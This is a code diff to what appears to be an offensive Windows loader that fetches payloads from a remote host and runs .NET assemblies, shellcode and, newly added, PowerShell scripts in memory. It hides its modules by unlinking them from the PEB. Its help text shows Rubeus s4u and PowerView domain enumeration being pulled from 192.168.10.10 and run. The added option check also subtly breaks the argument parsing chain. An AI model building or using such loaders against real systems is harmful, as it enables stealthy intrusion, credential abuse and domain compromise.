@@ -2,6 +2,10 @@
 
 #include "helper.hpp"
 #include "def.h"
+#include <iostream>
+#include <stdio.h>
+#include <fstream>
+#include <string.h>
 
 
 helper helperHandler;
@@ -104,9 +108,12 @@ helper helperHandler;
             "  --file              Remote file (/payload.bin)\n"
 			"  --args                args to pass to the file remotely\n"
 			"--use-https           Use HTTPS for remote fetching instead of default http\n"
-            "A example for dotnet execution:\n\n"
+            "--powershell          Load a powershell script as the --FilePath or --file for remote and args the invoked function inside that script"
+            "A example for dotnet /powershell execution:\n\n"
             ".\\main.exe dotnet --filePath C:\\Users\\ADMIN\\Debug\\test.exe --args test\n"
             ".\\main.exe dotnet --remote 192.168.10.10  --file /Rubeus.exe --args s4u\n"
+            ".\\main.exe dotnet --remote 192.168.10.10  --file /PowerView.ps1 --args Get-DomainUser\n"
+            ".\\main.exe dotnet --filePath C:\\Users\\ADMIN\\Debug\\PowerView.ps1 --args Get-DomainComputer\n"
             "\n"
 
             "Options for shellcode:\n"
@@ -131,6 +138,9 @@ helper helperHandler;
             std::string arg = argv[i];
             if (arg == "dotnet") {
                 opt.mode = "dotnet";
+            }
+            if (arg == "--powershell") {
+                opt.powershell = true;
             }
             else if (arg == "shellcode") {
                 opt.mode = "shellcode";
@@ -249,4 +259,21 @@ helper helperHandler;
         for (const auto& dll : modulesToUnlink) {
             UnlinkModuleFromPEB(dll);
         }
+    }
+
+
+
+
+    std::vector<unsigned char> helper::readLocalFile(const std::wstring& path) {
+        std::ifstream file(path, std::ios::binary | std::ios::ate);
+        if (!file.is_open()) return {};
+
+        std::streamsize size = file.tellg();
+        file.seekg(0, std::ios::beg);
+
+        std::vector<unsigned char> buffer(size);
+        if (file.read(reinterpret_cast<char*>(buffer.data()), size)) {
+            return buffer;
+        }
+        return {};
     }
